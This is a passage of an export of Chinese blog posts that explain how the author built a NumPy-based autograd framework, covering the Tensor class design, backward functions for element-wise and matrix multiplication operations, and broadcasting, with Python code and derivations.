autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n注意，这里的乘法不再是element-wise Product了，而是“货真价实”的Tensor Multiplication。前文提到过，张量乘法分为以下三种：\n\n\n- 一维向量间点乘——Dot\n- 多维张量与一维向量相乘——Mv\n- 多维张量与多维张量相乘——Mm\n\n如此从维数上进行区分是为了方便在反向传播时不容易乱套。\n\n\n下面先给出正向传播的代码，正向传播非常的无脑：\n\n\n\n```python\ndef __matmul__(self, other):\n    assert isinstance(other, Tensor), f\"argument 'other' must be Tensor, not {type(other)}\"\n    result = Tensor(self.data @ other.data, requires_grad=self.requires_grad or other.requires_grad)\n    if not result.grad_enable:\n        return result\n    result.children = [(self, None), (other, None)]\n    if self.ndim == 1 and other.ndim == 1:\n        result.grad_fn = DotBackward()\n    elif self.ndim == 1 or other.ndim == 1:\n        result.grad_fn = MvBackward()\n    else:\n        result.grad_fn = MmBackward()\n    return result\n```\n\n在Python中，`__matmul__`这个magic method对应的运算符是矩阵乘法运算符`@`，简单起见，限制了`other`的类型必须是Tensor。\n\n\n运算结果的data的计算，直接调用numpy.ndarray支持的`@`运算（矩阵乘法）得到，但在后面指定grad_fn时，根据维度的不同进行了分类，即分为我前面给出的三种张量乘法类别。下面依次对这三种情况下的梯度反向传播函数进行分析。\n\n\n\n\n---\n\n## DotBackward\n\n\n此为两个一维向量的点积，由多变量微积分，容易得出以下结论：\n\n\n对$s=\\vec{x}^T\\vec{y}$，有$\\frac{\\partial s}{\\partial\\vec{x}} = \\vec{y}$，$\\frac{\\partial s}{\\partial\\vec{y}} = \\vec{x}$，因此，DotBackward非常容易实现：\n\n\n\n```python\nclass DotBackward(BackwardFcn):\n    def __init__(self):\n        super(DotBackward, self).__init__()\n\n    def calculate_grad(self, grad, children, place):\n        a = children[1 - place][0].data\n        return grad * a\n```\n\n因为这是个二元运算，`children`的下标`1-place`相当于取出两个运算数中的不同于当前位次的另一个，与前面梯度的表达式相一致。\n\n\n## MvBackward\n\n\n此为一个张量与一个向量的乘积，在线性代数里，我们经常接触矩阵与向量的乘积，若张量维数超过了2，即不再是矩阵时，其与向量的乘法应该怎样定义？\n\n\n这里有一个与前面的广播机制类似的机制，对于一个维数超过2的张量，其与向量做乘法时，将视为多个形状相同的矩阵与向量分别做乘法。\n\n\n上面说的不是很清楚，再举例解释一下：\n\n\n我们知道$3\\times 4$的矩阵与长度为4的向量做乘法，将得到长度为3的向量，那么如果在矩阵前面添加一维，形成了$2\\times 3\\times 4$的张量，其也可以与长度为4的向量进行乘法运算，相当于2个$3\\times 4$的矩阵分别和向量进行乘法，最后将所有结果重新在前面的维度上堆叠起来。因此，得到的结果是一个$2\\times 3$的矩阵。同理，如果张量的形状是$5\\times 2\\times 3\\times 4$，在做乘法时，相当于$5\\times 2$个$3\\times 4$的矩阵分别与向量做乘法，再将所有结果堆叠起来，最后得到形状为$5\\times 2\\times 3$的张量。\n\n\n\n\n---\n\n既然Mv乘法是这种类似于广播的机制，我们就可以同样按之前处理广播的手段来类似地处理梯度反传。\n\n\n首先推导矩阵（二维张量）情况下的梯度反传公式（推导损失$L$对$A, \\vec{x}$的梯度），基于numpy对向量的处理和数学上有一点形式上的区别（例如向量只要长度正确，不需要转置就可以和矩阵相乘），下面的公式都将忽略向量的转置运算。$\\otimes$表示两个向量的叉积。\n\n\n第一种情形：\n\n\n$$A\\vec{x}=\\vec{y}$$\n\n\n由多变量函数的链式法则易得：\n\n\n$$\\frac{\\partial L}{\\partial \\vec{x}}=\\frac{\\partial L}{\\partial \\vec{y}}A$$\n\n\n$$\\frac{\\partial L}{\\partial A}=\\frac{\\partial L}{\\partial \\vec{y}}\\otimes\\vec{x}$$\n\n\n第二种情形：\n\n\n$$\\vec{x}A=\\vec{y}$$\n\n\n由多变量函数的链式法则易得：\n\n\n$$\\frac{\\partial L}{\\partial \\vec{x}}=A \\frac{\\partial L}{\\partial \\vec{y}}$$\n\n\n$$\\frac{\\partial L}{\\partial A}=\\vec{x}\\otimes \\frac{\\partial L}{\\partial \\vec{y}}$$\n\n\n虽然这两套公式本质上没区别，但我暂时没有找到把它们统一起来的优雅代码，因此我在反向传播的时候做了一个愚蠢的分类讨论，详细代码我就不贴了，请见我项目下autograd/backward.py中的MvBackward类。\n\n\n关于广播的处理，因为这里只可能对向量进行广播，因此只需要在计算对向量的梯度时，进行一个求和操作即可。求和的维度根据张量$A$的维数来定，在$A$的维度中去掉最后两个维度，例如若$A$是4维，则在$0,1,2,3$四个轴中去掉最后的$2,3$轴，在$0,1$轴上对梯度进行求和。\n\n\n\n```python\ngrad = np.sum(grad, tuple(range(a.ndim - 2))).reshape(x.shape)\n```\n\n代码中的外积运算，并没有使用numpy.outer，因为该函数只能用于两个一维的向量做外积，为了适应维度大于1的情形，需要将向量的外积运算通过扩展大小为1的维度，转化为标准的矩阵乘法运算。\n\n\n## MmBackward\n\n\n此为两个维度大于1的张量的乘法运算，这种张量乘法对两个张量的形状有一定的要求，如下：\n\n\n- 左张量的最后一个维度等于右张量的倒数第二个维度。（类似于矩阵乘法条件）\n- 两个张量的形状去掉最后两个维度后，满足广播条件。\n\n例如以下两个形状的张量积：\n\n\n`(2, 3, 4, 5)` × `(2, 3, 5, 6)`=> `(2, 3, 4, 6)`\n\n\n它的意义是，将第一个张量视为$2\\times 3$个$4\\times 5$形状的矩阵，置于第一个列表；将第二个张量视为$2\\times 3$个$5\\times 6$形状的矩阵，置于第二个列表。然后将两个列表一一配对，对每一对矩阵做普通的矩阵乘法运算，得到$2\\times 3$个形状为$4\\times 6$的矩阵，最后将所有乘积结果在前面两个维度上进行堆叠，得到形状为$2\\times 3\\times 4\\times 6$的张量。\n\n\n与前面类似，这种情况下，我们先计算两个张量维度均为2的情形，再对需要广播的情况进行求和操作。若$A,B,C$为矩阵：\n\n\n$$AB=C$$\n\n\n则：\n\n\n$$\\frac{\\partial L}{\\partial A}=\\frac{\\partial L}{\\partial C}B^T$$\n\n\n$$\\frac{\\partial L}{\\partial B}=A^T\\frac{\\partial L}{\\partial C}$$\n\n\n看上去居然比前面的Mv乘法形式还要简单。\n\n\n这两个公式对应到代码中的形式如下：\n\n\n\n```python\n# \\frac{\\partial L}{\\partial A}\ngrad = np.matmul(grad, a.swapaxes(-1, -2))\n# \\frac{\\partial L}{\\partial B}\ngrad = np.matmul(a.swapaxes(-1, -2), grad)\n```\n\n在多维情况下，使用swapaxes操作交换张量的最后两个轴，达到了公式里的转置效果。\n\n\n然后再来解决广播情形，与前面类似，我们同样可以计算两个张量分别需要扩展的维度，区别在于，需要移除张量最后两个维度，因为这两个维度是用来做矩阵乘法的，不参与广播机制。详细代码请见MmBackward类。\n\n\n\n\n---\n\n本文涉及到的反传代码比较晦涩难懂，尤其是后面两个运算，涉及到numpy对维度的一些操作。另外，将矩阵乘法和梯度公式向高维推广的过程也很令人头大，需要各位仔细琢磨琢磨。\n\n\n张量的乘法运算其实还包括两个一维向量的外积运算，不过我没有将这种乘法算在__matmul__方法中，而是单独实现了一个outer方法，向量外积运算的反向传播感觉比较容易，这里就略过了。\n\n\n后面一篇文章，将举一些特殊的张量运算的例子。\n","tags":["Python","神经网络","反向传播"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——梯度反传函数具体怎么写？（一）","url":"//blog/5783/","content":"\n[前一篇文章](/blog/5719/)简单介绍了计算图的节点类（Tensor类）的封装方法，在文末给了一个比较直观的反向传播模拟，我们发现，节点将梯度反传至其子节点的过程需要利用其梯度反传函数。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n为简单起见，在前面文章提到的例子里，所有节点的值均是一个标量，但在神经网络中，大部分节点都应该是矩阵或者更一般的张量形式，对张量运算计算梯度虽然原理类似，但仍会比标量复杂不少。而在代码实现时，其复杂程度的提升不仅仅来自于单变量到多变量的转变，还涉及到张量运算的广播机制。\n\n\n对于神经网络里可能涉及到的梯度反传函数，我大概将其分为三类：\n\n\n- 常见单变量函数的反传\n- 常见矩阵（张量）运算的反传\n- 卷积、池化运算的反传\n\n对于这三类我将从（我所认为的）简单到复杂，依次举一些我认为比较有代表性（简单）的例子。当然，限于篇幅，同样不可能面面俱到。但我认为，每一类里的思路是大体相同的。\n\n\n## 单变量函数的梯度反传\n\n\n常见单变量函数包含诸如指对数运算、Sigmoid、三角函数、绝对值函数（注意不是矩阵模）等，这些函数的特点是作用在单个张量上，即运算数只有一个，并且这类函数作用在一个张量上的效果，相当于函数对每一个元素进行单独作用，得到的结果形状与原张量相同。例如：\n\n\n$$abs(\\begin{bmatrix}1 & -2 & 3 \\\\ 2 & -4 & 4\\end{bmatrix})=\\begin{bmatrix}1 & 2 & 3 \\\\ 2 & 4 & 4\\end{bmatrix}$$\n\n\n对于这类函数，直接把单变量求导法则推广过去就可以了。例如对于绝对值函数的梯度反传函数我是这样考虑的：\n\n\n对于child中每一个正值位，梯度传回系数为1，对于child中每一个负值位，梯度传回系数为-1，对于child中值为0值位，梯度传回0。\n\n\n\n```python\nclass AbsBackward(BackwardFcn):\n    def calculate_grad(self, grad, children, place):\n        x = children[0][0].data\n        return (2. * (x >= 0.).astype(float) - 1.) * (x != 0) * grad\n```\n\n上面是我乱写的绝对值函数的梯度反传代码，注意到这个函数传入了三个参数：`grad`、`children`与`place`，在我的设计中，所有梯度反传函数均需要传入这三个参数，它们分别表示：\n\n\n- `grad`：当前节点的梯度\n- `children`：当前节点的所有子节点列表（计算梯度时很可能会需要其他子节点的信息，所以干脆把所有children传进去）\n- `place`：当前正在计算梯度的子节点在children中的位次（位次在非对称运算中挺重要的，例如减法运算，对两个运算数产生的梯度是不同的）\n\n如上面绝对值运算的例子，若$$\\begin{bmatrix}1 & 2 & 3 \\\\ 2 & 4 & 4\\end{bmatrix}$$的梯度为$$\\begin{bmatrix}2 & -3 & 1 \\\\ -1 & 2 & 2\\end{bmatrix}$$，则传至$$\\begin{bmatrix}1 & -2 & 3 \\\\ 2 & -4 & 4\\end{bmatrix}$$的梯度应该是$$\\begin{bmatrix}2 & 3 & 1 \\\\ -1 & -2 & 2\\end{bmatrix}$$。如果你看不懂这是啥意思，那我建议你先去复习复习高中的导数。\n\n\n与代码中的变量作个对应：\n\n\n`grad`=$$\\begin{bmatrix}2 & -3 & 1 \\\\ -1 & 2 & 2\\end{bmatrix}$$，`x`=$$\\begin{bmatrix}1 & -2 & 3 \\\\ 2 & -4 & 4\\end{bmatrix}$$\n\n\n这类单变量函数的梯度反传函数都比较容易写，于是我先把这部分实现了一下。\n\n\n## 常见张量运算的梯度反传\n\n\n张量运算包含最基本的element-wise加减乘除四则运算，其中，乘法除了element-wise乘法，还有张量的乘法，而后者又包含三种子情况，如下：\n\n\n- 一维向量间点乘——Dot\n- 多维张量与一维向量相乘——Mv\n- 多维张量与多维张量相乘——Mm\n\n另外，张量运算还包含一些特殊运算，例如转置运算、reshape运算、最大最小值运算等，包含的内容之多，令人顿感头大，但若耐心地一条一条写，这些特殊运算梯度反传的思路其实并不难，总是能写完的。\n\n\n限于篇幅，下文仅介绍张量element-wise四则运算的梯度反传思路。其余的留到后面文章再进行有选择性的讨论。\n\n\n\n\n---\n\n所谓element-wise，即元素间的四则运算，在数学上，这种运算要求两个参与运算的张量具有相同的形状，如以下element-wise Addition：\n\n\n$$\\begin{bmatrix}1&2&3\\\\-1&-2&-3\\end{bmatrix}+\\begin{bmatrix}2&3&4\\\\-1&-2&-1\\end{bmatrix}=\\begin{bmatrix}3&5&7\\\\-2&-4&-4\\end{bmatrix}$$\n\n\n像上面这种形状相同的情况，不论是加减法还是乘除法，梯度反传其实都格外容易。以下以加法为例：\n\n\n\n```python\nclass AddBackward(BackwardFcn):\n    def calculate_grad(self, grad, children, place):\n        return grad\n```\n\n如果能确保加法运算中两个张量的形状相同，那么上面这样写就已经万无一失了。\n\n\n然而，我们经常有对不同形状的张量进行元素间四则运算的需求。举个最常见的例子，将一个标量与一个$2\\times 3$的矩阵相加，会得到什么？按数学的逻辑，这是会报错的行为，但显然numpy中是许可这类行为的，而且结果非常符合逻辑，它会把这个标量加到$2\\times 3$矩阵的每一个元素上。\n\n\n$$3 +\\begin{bmatrix}1&2&3\\\\-1&-2&-3\\end{bmatrix}= \\begin{bmatrix}4&5&6\\\\2&1&0\\end{bmatrix}$$\n\n\n看似显然的结果，实则是张量运算中复杂的**广播机制**（Broadcast）的冰山一角。\n\n\n我先问：广播机制对梯度的反向传播有什么影响？\n\n\n考虑以下计算式：\n\n\n$$Sum(3 +\\begin{bmatrix}1&2&3\\\\-1&-2&-3\\end{bmatrix})=18$$\n\n\n请计算上式求和的结果18对3这个变量的梯度。\n\n\n显然梯度不是1吧！因为广播机制的存在，3这个变量相当于被加了6次，所以最后结果应该是6而不是1。\n\n\n那么这个6是从何而来？从这个例子里，很容易看出，6恰好是第二个矩阵的长乘宽，但这毕竟只是最简单的例子，要想写出适应所有情况的代码，就免不了完全搞明白广播的运作机制。\n\n\n### 广播机制（Broadcast）\n\n\n菜鸟教程对广播的解释如下：广播(Broadcast)是 numpy 对不同形状(shape)的数组进行数值计算的方式，对数组的算术运算通常在相应的元素上进行。\n\n\n网上有不少广播机制的示意图，但我的目的是从逻辑上解释广播，故不再画图，直接总结一下广播机制的流程：\n\n\n拿到两个张量后，可以通过下面的流程来判断这两个矩阵是否可以进行广播：\n\n\n1. 分别写出两个张量的形状，张量的形状是一个元组（tuple）类型的元素，特殊地，标量的形状为空元组。\n2. 若两个张量形状的长度不同（维数不同），对维数较小的张量，向前（元组的左侧方向）扩展大小为1的维度。\n3. 经过第2步的扩展，现在两个张量的维数已经相同，将两个张量当前的形状依维度进行比较。若遇到两个张量在某个维度上数值不同，并且两个张量在该维度上的长度均不为1，则这两个张量无法进行广播。\n4. 否则，可以进行广播。对每一个张量，在所有大小为1的维度上，复制自身直至与另一个张量的该维度大小相同。\n\n描述起来感觉有点晕乎，还是以具体的例子来说明吧，对于前面的例子：\n\n\n$$3 +\\begin{bmatrix}1&2&3\\\\-1&-2&-3\\end{bmatrix}$$\n\n\n1. 第一个张量，是个标量，于是形状为空元组：`()`；第二个张量，形状为`(2, 3)`。\n2. 因为两个张量的维数不同，我们在维数较小的张量(标量3)上，向前扩展长度为1的维度，直到两个张量维数相同。该操作结束后，标量3变成了二维矩阵$\\begin{bmatrix}3 \\end{bmatrix}$，形状变为了`(1, 1)`。\n3. 依次比较`(1, 1)`和`(2, 3)`，在两个张量第0个维度上，长度分别为1和2，数值不同，但第一个张量在该维度上长度为1，因此第0维通过；在第1个维度上，长度分别为1和3，数值也不同，但第一个张量在该维度上长度同样是1，因此第1维也通过。\n4. 因此，这两个张量能够进行广播，我们需要把第一个张量通过在第0维和第1维上复制自身的方式扩展到与第二个张量形状相同，因此，第一个张量又变成了：\n\n$$\\begin{bmatrix}3&3&3\\\\3&3&3\\end{bmatrix}$$\n\n\n这样就能直接与第二个张量相加了。\n\n\n\n\n---\n\n请判断以下各组形状的张量是否能够通过广播机制进行element-wise Addition操作：\n\n\n- `(1, 5, 6)`和`(2, 1, 6)`\n- `(4, 3)`和`(3,)`\n- `(4, 3)`和`(3, 1)`\n- `(3, 4, 5, 6, 7)`和`(6, 7)`\n- `(3, 4, 5, 6, 7)`和`(3, 4)`\n- `(4, 2, 3, 1, 2)`和`(4, 3, 5, 2)`\n\n揭晓答案：\n\n\n- 可以，结果的形状为`(2, 5, 6)`\n- 可以，结果的形状为`(4, 3)`\n- 不可以（和前面一条的区别在哪？）\n- 可以，结果的形状为`(3, 4, 5, 6, 7)`\n- 不可以\n- 不可以\n\n\n\n---\n\n### 广播机制下的梯度反传\n\n\n到了这里，相信你已经对张量的广播机制了如指掌了。在进行梯度反向传播时，我们只要先计算出经过广播后的子节点的梯度`grad`，然后通过上面的广播规则计算出子节点在广播时需要扩展自身的维度，然后对`grad`在这几个扩展自身的维度上进行求和，即可得到子节点真正的梯度。\n\n\n继续回到前面的例子：\n\n\n$$Sum(3 +\\begin{bmatrix}1&2&3\\\\-1&-2&-3\\end{bmatrix})$$\n\n\n计算对3的梯度时，我们先按正常的方法计算出了对3进行广播扩展后的张量：$$\\begin{bmatrix}3&3&3\\\\3&3&3\\end{bmatrix}$$的梯度。\n\n\n这个梯度自然是$$\\begin{bmatrix}1&1&1\\\\1&1&1\\end{bmatrix}$$\n\n\n现在我们需要知道张量3在哪几个维度扩展了自身，由前面的规则，自然是第0个和第1个维度，在这俩维度上，张量3为了使自身形状与第二个矩阵相同，分别扩展了2次和3次，因此我们需要把得到的梯度在这两个维度上进行求和，numpy的求和功能自带指定多个求和维度作为参数：\n\n\n\n```python\ntrue_grad = np.sum(grad, axis=(0, 1))\n```\n\n这样还真就得到了它真正的梯度：6\n\n\n搞明白了广播机制后，求梯度真是容易极了。相信你也同样这么觉得，赶紧趁热打铁，把四则运算的梯度反传函数都写一遍吧！\n\n\n不过，虽然我很清楚广播机制，但在广播的代码处理上，我写的非常蠢，我的代码位于项目autograd文件夹下的[broadcast.py](https://github.com/windshadow233/autograd-with-numpy/blob/main/nptorch/autograd/broadcast.py)文件中，如果你有更好的idea，欢迎告诉我！\n\n\n\n\n---\n\n下一篇文章将简单介绍张量乘法的梯度反传函数。\n","tags":["Python","神经网络","反向传播"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——Tensor类的封装思路","url":"//blog/5719/","content":"\n该系列的前一篇文章提到了计算图以及误差在计算图中的传播方式，计算图作为一种图结构，在代码实现上也是比较容易，只需要合理定义图的节点类，再实现一些方法即可，本文将简单讲解一下我自己写的计算图的节点类，语言自然是Python，代码写的比较垃圾，希望高手们多多包涵！\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n\n从这篇文章开始，我将会陆陆续续贴一些代码，手机端的朋友们对不住了！建议前往电脑端浏览器进行浏览。\n\n\n## 初始化\n\n\n作为计算图的节点，如前面提到的，需要包含的基本attribute有以下：\n\n\n- 节点的数据  \n\n非常容易理解，如前面计算图中提到的$x, y, z$这些数，就是其节点的数据，不过，实际操作中，这些数据都是张量，神经网络中为了并行化提速，一般不会一个数一个数地算，而是直接写成矩阵、张量形式，进行矩阵、张量运算（矩阵即二维的张量）。\n- 节点是否需要梯度  \n\n这是个布尔值，众所周知，在计算图中有一些数是需要计算梯度的，比如神经网络的待训练参数、待训练参数经过运算得到的其他数。一句话概括，从计算图的根节点出发，到达待训练参数叶子的路径上的每一个节点，都需要计算梯度（不然梯度怎么传递到叶子？）。另外有很多常数张量，例如所有输入到神经网络里的训练数据，它们就不需要梯度。因此，加入这个布尔变量是为了减少不必要的梯度计算。\n- 节点的梯度  \n\n这也是个张量，形状与节点的数据形状相同，表示计算图的根节点对此节点的梯度值。在参数梯度下降更新的时候会用到这个值。\n- 节点的子节点  \n\n这是图结构中最基本的东西了，用来存放该节点的所有子节点，即计算图上指向该节点的所有其他节点，或者说，该节点是通过所有的子节点的某种运算得到的。\n- 节点的梯度反传函数  \n\n这个属性用来记录该节点是其子节点通过何种运算得到的，例如$a+b=c$，就在$c$节点上记录梯度计算函数为“加法”，因为我们只有知道节点是通过何种运算得到的，才能顺利将自己的梯度前推至其子节点上。这里的一个注意点是，一个节点的梯度反传函数并非用以计算其自身的梯度，而是用以将自身的梯度向前传播至其每个子节点。\n\n\n\n---\n\n下面给出我的类初始化方法：\n\n\n\n```python\nclass Tensor(object):\n    def __init__(self, data, dtype=None, requires_grad=False):\n        if isinstance(data, Tensor):\n            data = data.data\n        if dtype is None:\n            self.data = np.array(data)\n            if self.dtype == float64:\n                self.data = self.data.astype(float32)\n        else:\n            self.data = np.array(data, dtype=dtype)\n        assert 'float' in self.dtype.name or not requires_grad, \\\n            'Only Arrays of floating point dtype can require gradients'\n        self.requires_grad = requires_grad\n        self.grad_fn = None\n        self.children = []\n        self.grad = None\n        self._retain = False\n```\n\n可不必纠结于上面代码的细节（中间部分逻辑写的很无脑），只需知道以下：\n\n\n在初始化的时候，需要传入节点的数据（我用的class就是numpy.ndarray），可指定数据类型，以及是否需要梯度，后面初始化的requires_grad即该节点是否需要梯度；grad_fn为梯度反传函数，初始值是None；children为子节点，因为children的数量是不确定的，故这里定义为一个列表；grad是节点的梯度，初始值也是None。最后一个_retain参数我之前没提到，该参数其实是用来决定此节点是否需要把梯度值存储到grad属性上。那么_retain参数是否和requires_grad重复了呢？各位可以思考一下这个问题，后文会揭晓答案。\n\n\n## 张量运算\n\n\n作为张量类，运算方法肯定是必不可少的，而因为我们用来构建计算图的方法是动态图，在每一次运算中，都需要在图上连几条箭头，所以在定义运算方法的时候需要做一些操作。\n\n\n这里给一个我定义加法的例子：\n\n\n\n```python\ndef __add__(self, other):\n    if isinstance(other, Number):\n        result = Tensor(self.data + other, dtype=self.dtype, requires_grad=self.requires_grad)\n    else:\n        result = Tensor(self.data + other.data, dtype=self.dtype, requires_grad=self.requires_grad or other.requires_grad)\n    if result.grad_enable:\n        result.children = [(self,), (other,)]\n        result.grad_fn = AddBackward()\n    return result\n\ndef __radd__(self, other):\n    return self.__add__(other)\n```\n\n为了避免繁杂的讨论，我们限定加法以及后面几乎所有的二元运算的other对象只能是两种类型：Number与Tensor自身。在`__add__`方法中，首先要得到计算结果的data属性，即它的数据，这个比较简单，直接把自己的data和加数的data加起来就好了。但有一个问题，如果加数只是普通的数字，不是Tensor类，它没有data这个attribute，这样是会报错的，这里就对加数的类型进行了讨论，如果是数字，那么直接把data和它加起来就行。\n\n\n第二点是，如何判断得到的结果是否需要梯度，控制该属性的attribute是requires_grad参数，在初始化时可以作为参数直接传入Tensor类，回想一下前面提到的**“从计算图的根节点出发，到达待训练参数叶子的路径上的每一个节点，都需要计算梯度”**，这意味着，如果某个参数需要梯度，那么只要有它参与的任何运算得到的结果，也会需要梯度（不然梯度路径断了，传不到叶子）。在加法过程中，如果加数是普通的数字，那么加数不需要梯度，我们只需要判断节点自身是否需要梯度即可，故结果的requires_grad自然就是节点自身的requires_grad；如果加数也是个Tensor，通过一样的逻辑可以得到，结果的requires_grad相当于加数和自己的requires_grad属性做一个或运算，只要它们随便哪个需要梯度，那么得到的结果必然需要梯度。\n\n\n第三点是children的放置，刚才只是给出了运算结果的data以及其是否需要计算梯度，相对于定义了计算图的一个节点，接下来当然是要把这个节点连到计算图上去了，方法也很简单，只要在children里把参与加法操作的两个数放进去，第一个是自身，第二个就是加数，那么children就应该是`[self, other]`。然而我代码里面是这样的：`[(self,), (other,)]`，是俩元组类型，元组的第0位是真正的child，而后面的位置我本来是打算预留一些其他信息的，有一些特殊的运算，在算梯度时需要知道除了运算数以外的信息，例如`transpose`（矩阵的转置运算在张量上的推广）运算在反传梯度的时候，就需要知道之前是交换了哪几个轴，光知道运算数是不够的，像这类信息，我在一开始设计的时候就把它存在children这里，后面为了在反向传播代码中保持统一，就对所有的运算都采用这样的存法了。\n\n\n最后也是最重要的，梯度反传函数的指定，把运算结果节点接上去以后，需要指定其梯度反传函数，说白了就是这个结果通过什么运算得来的，这里就是加法运算，对于每一个涉及到的运算，我都在另一个文件里定义了一个backward函数，对于加法，就叫做`AddBackward`（即Add操作的反向传播），可以暂时当做是指明了“加法”。\n\n\n\n\n---\n\n这里有个小问题，在后面构建计算图之前，我用的判断语句是`if result.grad_enable`，而不是`if result.requires_grad`，这是什么玩意？前面也没提到啊？这其实是我强行模仿PyTorch的产物，它有一个称为no_grad的运算模式，该模式下，所有的梯度运算都将被忽略，在测试模型的时候非常有用，可以省下大量搭建计算图需要的空间和时间，这里的`grad_enable`将判断当前是否处于此模式下，以及`result`是否需要梯度，这两个布尔值只有全部为True，才会进入下面计算图的构建环节。\n\n\n\n\n---\n\n其余的张量运算，不想举例了！其实都差不多，可以翻看我的[源码文件](https://github.com/windshadow233/autograd-with-numpy/blob/main/nptorch/tensor.py)，写的非常冗杂，请见谅，若有疑问可以直接问我！\n\n\n## 反向传播\n\n\n张量类最重要的功能就是反向传播，我定义了一个`backward`函数在最后。\n\n\n\n```python\ndef backward(self, grad=None):\n    if not self.grad_enable:\n        return\n    stack = [(self, grad)]\n    while stack:\n        item, grad = stack.pop()\n        if item.is_leaf:\n            continue\n        if grad is None:\n            assert item.size == 1, 'grad can be implicitly created only for scalar outputs'\n            grad = np.ones_like(item.data)\n            if item._retain_grad:\n                item.grad = Tensor(grad)\n        for i, child in enumerate(item.children):\n            child_tensor = child[0]\n            if isinstance(child_tensor, Tensor) and child_tensor.requires_grad:\n                child_grad = item.grad_fn.calculate_grad(grad, item.children, i)\n                if child_tensor._retain_grad:\n                    if child_tensor.grad is None:\n                        child_tensor.grad = Tensor(np.zeros_like(child_tensor.data), dtype=child_tensor.dtype)\n                    child_tensor.grad = child_tensor.grad + Tensor(child_grad, dtype=float32)\n                stack.append((child_tensor, child_grad))\n    return\n```\n\n该函数实现了一个有向图的深度优先搜索。`stack`列表用来充当栈，维护需要遍历的节点。\n\n\nfor循环中我遍历了当前搜索节点的所有children节点，对每一个类型为Tensor且需要计算梯度的child，主要做了以下两件事：\n\n\n1. 通过节点的`grad_fn`（梯度反传函数）的`calculate_grad`方法，来计算child的梯度。这里的`calculate_grad`，是梯度反传函数计算梯度的方法，后面将会重点提到。\n2. 将`child_tensor`以及前面计算出来的对该子节点的偏导数放入栈中，以此实现图的深度优先遍历，把梯度从根节点一步步传回到叶子。\n\n中间有一条判断语句：`if child_tensor._retain_grad`，这即是我前面提到的，判断是否需要存储梯度，所谓存储梯度，其实就是把算出来的梯度叠加其的grad属性上。如果子节点`child_tensor`需要存储梯度，那么先判断其梯度是否为None，若为None，将其初始化为零张量。最后把得到的子节点的梯度`child_grad`加上去就好了！对于不需要存储梯度的节点，就省去了这一步，也节省了空间支出。那么，回到前面留下的那个悬念，这个_retain_grad参数是否就和requires_grad参数重复了呢？其实不然，对于在反向传播路径上的非叶子节点而言，它们自然需要计算梯度，也就是requires_grad为True，但一般情况下，它们不需要把自身梯度记录下来，这是因为后面梯度更新的时候并不需要更新它们，对这些路径上的非叶子节点而言，它们在每次算来的梯度（偏导数）后，只需要把梯度直接向子节点传下去即可。也就是说：\n\n\n**一般情况下，只有叶子节点，才有必要存储梯度！中间结果的节点只需要计算梯度，不需要存储梯度。**\n\n\n\n\n---\n\n下面给一个简单的例子来可视化一下$e=(a+b)\\times a$的计算图中，计算$\\frac{\\partial e}{\\partial a}与\\frac{\\partial e}{\\partial b}$的过程模拟，假设\n\n\n$$a=5, b=2, c=a+b=7$$  \n$$e=7\\times 5=35$$  \n并且为了清晰起见，节点的主要属性会被记录在其中，且过程中所有节点均将累计梯度存在节点里，当前正在进行反向传播的路径将会进行加粗显示，该次反向传播中发生改变的梯度值也会加粗显示。\n\n\n需要注意的是，下面计算图中出现的两块“a”节点，事实上是同一个节点，这里将其分开是为了让计算图的结构更清晰。\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/91276db19f0d37b3c1c1d6fe12385421.png)\n\n\n---\n\n![](https://oss.fyz666.xyz/blogfiles/png/98466586ef8bdc12b09eacd427d0af29.png)\n\n\n---\n\n![](https://oss.fyz666.xyz/blogfiles/png/1a043d088938c1b7b799ffc5fa3dea0f.png)\n\n\n---\n\n![](https://oss.fyz666.xyz/blogfiles/png/d4a80ce3289c8bbd9c3f37bf54e2ad85.png)\n\n\n---\n\n![](https://oss.fyz666.xyz/blogfiles/png/e5e2bbd3e2a05842051e21b8a218d17b.png)\n\n\n---\n\n![](https://oss.fyz666.xyz/blogfiles/png/c2106a552b32b7db6f2accaa2da6c5b7.png)\n\n\n---\n\n最后得到的结果为$\\frac{\\partial e}{\\partial a}=12, \\frac{\\partial e}{\\partial b}=5$，和自己口算的应该没差吧。\n\n\n\n\n---\n\nTensor类涉及到的方法还有很多很多，文件有一千多行，没有办法面面俱到，但我认为主要就是这几个，其他的都比较易于理解，有兴趣的话可以自己去看一下我的源码。\n\n\n其实我对这个Tensor类的写法是相当不满意的，感觉写的太冗杂了，而且设计结构的时候没有充分考虑清楚，各位可以自己去摸索一下计算图节点的定义方法，看看怎么样搞更合适。\n\n\n该系列接下来的文章将开始进入正轨，也就是各种运算的梯度反传函数的写法（WTF？才进入正轨？？）。梯度反传函数我写的非常乱七八糟，但至少能算对！这就已经让我很心满意足了。\n","tags":["Python","神经网络","反向传播"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——计算图及其构建方式的选择","url":"//blog/5646/","content":"\n此文将简单介绍神经网络在编程实现中最重要的概念之一——计算图（Computation Graph）。\n\n其实这部分的内容网上很多博客已经说的很清楚了，那我为什么还要写呢？当然为了凑篇水文！（没看到本站其他文章都是类似于这样的水文吗）除此以外，本文还将介绍计算图的两种常见的构建方式，以及我在自己的神经网络框架中，选择了哪一种作为计算图的实现。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n在进入正文前，首先请确保你知道训练神经网络的最流行的算法是所谓的“误差逆传播（Error BackPropagation）算法”，我则习惯于称之为“反向传播”，或backward。若你还不知道反向传播，你可能没办法理解计算图是为了干啥。\n\n\n## 计算图\n\n\n下面贴一条Google上搜到的对计算图的定义：\n\n\n**计算图**被定义为**有向图**，其中节点对应于数学运算。 **计算图**是表达和评估数学表达式的一种方式。 